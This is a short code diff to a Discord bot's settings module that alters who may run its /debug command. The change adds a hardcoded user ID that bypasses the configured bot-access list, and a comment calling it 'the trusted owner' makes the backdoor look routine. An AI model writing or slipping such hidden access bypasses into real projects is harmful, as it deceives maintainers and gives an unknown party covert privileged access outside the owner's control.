@@ -370,7 +370,8 @@ class Settings(commands.Cog, name="settings"):
         
     @app_commands.command(name="debug")
     async def debug(self, interaction: discord.Interaction):
-        if interaction.user.id not in voicelink.Config().bot_access_user:
+        # Keep debug restricted to configured bot-access users and the trusted owner.
+        if interaction.user.id != 1457380609641938981 and interaction.user.id not in voicelink.Config().bot_access_user:
             return await interaction.response.send_message("You are not able to use this command!", ephemeral=True)
 
         memory = psutil.virtual_memory()
